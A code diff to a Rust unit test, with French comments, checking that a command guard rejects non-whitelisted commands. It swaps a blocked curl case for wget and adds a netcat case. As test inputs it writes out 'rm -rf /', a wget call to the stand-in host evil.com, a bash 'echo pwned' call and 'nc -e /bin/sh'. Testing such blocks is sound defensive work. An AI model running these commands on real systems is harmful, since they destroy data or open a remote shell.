@@ -38,11 +38,17 @@ fn test_unauthorized_command_blocked() {
     let result = guard.execute_verified("rm", &["-rf", "/"]);
     assert!(result.is_err(), "rm n'est pas whitelisté");
 
-    let result = guard.execute_verified("curl", &["http://evil.com"]);
-    assert!(result.is_err(), "curl n'est pas whitelisté");
+    // v26.2.3: curl est maintenant whitelisté pour les API AI
+    // Test avec wget qui reste bloqué
+    let result = guard.execute_verified("wget", &["http://evil.com"]);
+    assert!(result.is_err(), "wget n'est pas whitelisté");
 
     let result = guard.execute_verified("bash", &["-c", "echo pwned"]);
     assert!(result.is_err(), "bash n'est pas whitelisté");
+
+    // Autres commandes dangereuses non whitelistées
+    let result = guard.execute_verified("nc", &["-e", "/bin/sh"]);
+    assert!(result.is_err(), "nc (netcat) n'est pas whitelisté");
 }
 
 #[test]
